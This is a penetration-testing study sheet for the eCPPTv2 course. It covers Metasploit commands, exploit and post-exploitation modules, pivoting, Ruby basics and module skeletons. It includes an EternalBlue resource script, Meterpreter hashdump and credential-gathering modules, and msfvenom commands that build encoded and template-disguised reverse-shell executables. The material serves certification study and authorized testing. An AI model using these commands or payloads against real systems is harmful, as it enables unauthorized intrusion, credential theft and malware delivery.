# Metasploit & Ruby - eCPPTv2

## Overview
Metasploit Framework usage and Ruby scripting for penetration testing and exploit development.

**Sources**: 
- [johnermac.github.io](https://johnermac.github.io/notes/ecppt/ruby/)
- [dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)

## Metasploit Framework

### Basic Commands
```bash
# Start Metasploit
msfconsole

# Database
msfdb init
msfdb start
msfdb stop

# Search
search <term>
search type:exploit <term>
search type:auxiliary <term>
search type:post <term>

# Use module
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options
show payloads
show targets
show advanced

# Set options
set RHOSTS <target>
set RPORT <port>
set PAYLOAD <payload>
set LHOST <attacker_ip>
set LPORT <port>

# Run
exploit
run
```

### Exploit Modules
```bash
# Windows exploits
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/smb/psexec
exploit/windows/http/badblue_passthru

# Linux exploits
exploit/linux/samba/is_known_pipename
exploit/linux/http/apache_mod_cgi_bash_env_exec

# Web exploits
exploit/unix/webapp/wp_admin_shell_upload
exploit/multi/http/struts2_code_exec
```

### Payloads
```bash
# Windows
windows/meterpreter/reverse_tcp
windows/shell/reverse_tcp
windows/x64/meterpreter/reverse_tcp

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Generic
generic/shell_reverse_tcp
```

### Meterpreter
```bash
# System info
sysinfo
getuid
getsystem

# File system
pwd
cd
ls
download <file>
upload <file>

# Process
ps
migrate <PID>
execute -f <command>

# Network
ipconfig
route
portfwd add -l <local_port> -p <remote_port> -r <remote_host>

# Privilege escalation
getsystem
hashdump
```

### Auxiliary Modules
```bash
# Scanners
auxiliary/scanner/portscan/tcp
auxiliary/scanner/smb/smb_version
auxiliary/scanner/http/http_version

# Information gathering
auxiliary/gather/shodan_search
auxiliary/scanner/discovery/udp_sweep
```

### Post Exploitation
```bash
# Windows
post/windows/gather/credentials/windows_autologin
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_shares
post/windows/gather/hashdump
post/windows/gather/enum_applications
post/windows/gather/enum_domain
post/windows/gather/enum_patches

# Linux
post/linux/gather/enum_users_history
post/linux/gather/enum_network
post/linux/gather/enum_configs
post/linux/gather/enum_system
```

### Pivoting
```bash
# Add route
route add <subnet> <netmask> <session_id>
route print

# Port forward
portfwd add -l <local_port> -p <remote_port> -r <remote_host>
portfwd list
portfwd delete <local_port>

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run
```

### Resource Scripts
```bash
# Create resource script
# save commands to file.rc
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444
exploit

# Run resource script
msfconsole -r file.rc
# Or in msfconsole:
resource file.rc
```

## Ruby Basics

### Variables
```ruby
# Local
variable = "value"

# Instance
@variable = "value"

# Class
@@variable = "value"

# Global
$variable = "value"
```

### Data Types
```ruby
# Strings
string = "Hello"
string = 'World'

# Numbers
integer = 42
float = 3.14

# Arrays
array = [1, 2, 3]
array = Array.new

# Hashes
hash = {"key" => "value"}
hash = {key: "value"}
```

### Control Structures
```ruby
# If/Else
if condition
  # code
elsif condition
  # code
else
  # code
end

# Loops
while condition
  # code
end

for i in 0..10
  # code
end

array.each do |item|
  # code
end
```

### Methods
```ruby
def method_name(parameter)
  # code
  return value
end

# Method with default parameter
def method_name(parameter = "default")
  # code
end

# Method with multiple parameters
def method_name(param1, param2)
  # code
end
```

### Classes
```ruby
class MyClass
  def initialize
    @variable = "value"
  end

  def method
    puts @variable
  end
end

# Create instance
obj = MyClass.new
obj.method
```

### Modules
```ruby
module MyModule
  def module_method
    puts "Module method"
  end
end

class MyClass
  include MyModule
end

obj = MyClass.new
obj.module_method
```

### Error Handling
```ruby
begin
  # code that might raise error
rescue => e
  puts "Error: #{e.message}"
ensure
  # code that always runs
end
```

## Metasploit Module Development

### Exploit Module Structure
```ruby
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Module Name',
      'Description'    => %q{Description},
      'Author'         => ['Author'],
      'License'        => MSF_LICENSE,
      'References'     => [['URL', 'http://example.com']],
      'Platform'       => 'win',
      'Targets'        => [['Windows', {}]],
      'DefaultTarget'  => 0,
      'Privileged'     => false,
      'DisclosureDate' => '2023-01-01'
    ))

    register_options([
      Opt::RPORT(80)
    ])
  end

  def exploit
    connect
    # Exploit code
    disconnect
  end
end
```

### Auxiliary Module Structure
```ruby
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize
    super(
      'Name'        => 'Auxiliary Module',
      'Description' => 'Description',
      'Author'      => ['Author'],
      'License'     => MSF_LICENSE
    )

    register_options([
      Opt::RPORT(80)
    ])
  end

  def run
    connect
    # Code
    disconnect
  end
end
```

## Advanced Metasploit

### Multi-Handler
```bash
# Set up listener for multiple payloads
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker>
set LPORT 4444
set ExitOnSession false
exploit -j
```

### AutoRunScript
```bash
# Automatically run commands on new session
set AutoRunScript post/windows/gather/hashdump
exploit
```

### Session Management
```bash
# List sessions
sessions -l

# Interact with session
sessions -i <session_id>

# Background session
background

# Kill session
sessions -k <session_id>

# Upgrade shell to meterpreter
sessions -u <session_id>
```

### msfvenom Advanced
```bash
# Generate encoded payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe

# Generate payload with custom template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -x template.exe -f exe -o shell.exe

# Generate PowerShell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f psh -o shell.ps1

# Generate DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker> LPORT=4444 -f dll -o shell.dll
```

## Tools
- **Metasploit Framework** - Exploitation framework
- **Ruby** - Programming language
- **msfvenom** - Payload generator
- **msfconsole** - Metasploit console
- **Armitage** - GUI for Metasploit
- **Cobalt Strike** - Advanced red team framework

## Resources
- **Metasploit Unleashed**: https://www.offensive-security.com/metasploit-unleashed/
- **Ruby Documentation**: https://www.ruby-lang.org/en/documentation/
- **Metasploit GitHub**: https://github.com/rapid7/metasploit-framework

## Last Updated
January 2025

